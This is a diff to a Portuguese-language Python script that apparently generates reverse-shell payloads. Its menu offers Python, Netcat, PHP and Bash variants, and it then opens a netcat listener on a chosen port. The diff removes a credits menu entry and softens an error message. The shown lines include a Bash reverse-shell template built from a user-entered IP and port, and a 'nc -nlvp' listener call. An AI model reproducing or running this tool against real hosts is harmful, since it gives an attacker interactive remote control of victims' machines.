@@ -22,8 +22,7 @@ print("""
 [ 1 ] Python
 [ 2 ] Netcat
 [ 3 ] PHP 
-[ 4 ] Bash
-[ 5 ] Creditos """)
+[ 4 ] Bash """)
 foda = int(input('>>> '))
 if foda == 1:
 	ip_foda = input("IP: ")
@@ -57,17 +56,12 @@ elif foda == 4:
 comando:
 bash -i >& /dev/tcp/{}/{} 0>&1""".format(ip_puta, porta_puta))
 	
-
-elif foda == 5:
-	print("""
-[INSTAGRAM]: @gt9sec
-[TIKTOK]: @gt9sec
-[TEAM]: SkullSec""")
-
 else:
-	print("opção invalida vagabundo")
+	print("opção invalida")
 
 print("\nEnsira a porta da escuta: ")
 fds = int(input(">>> "))
 print("\nescutando...")
 os.system("nc -nlvp {}".format(fds))
+
+
